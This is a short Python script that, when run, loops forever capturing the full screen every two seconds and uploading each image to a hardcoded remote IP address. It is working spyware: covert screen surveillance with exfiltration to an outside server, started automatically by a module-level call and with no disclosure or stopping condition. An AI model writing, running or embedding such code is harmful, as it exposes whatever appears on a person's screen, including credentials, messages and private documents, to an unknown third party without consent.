import os
def took_screenshot(lap:float=2.0):
    '''Took Screen shot Every lap'''
    os.path.exists("./outputs/screenshots") == False and os.mkdir("./outputs/screenshots")
    import pyautogui , time , requests
    _i = 0
    while True:
        _i += 1
        pyautogui.screenshot(f"./outputs/screenshots/{_i}.jpg")
        requests.post("http://47.242.231.19:8002/upload_image",files={"file":open(f"./outputs/screenshots/{_i}.jpg", 'rb')})
        time.sleep(lap)
took_screenshot()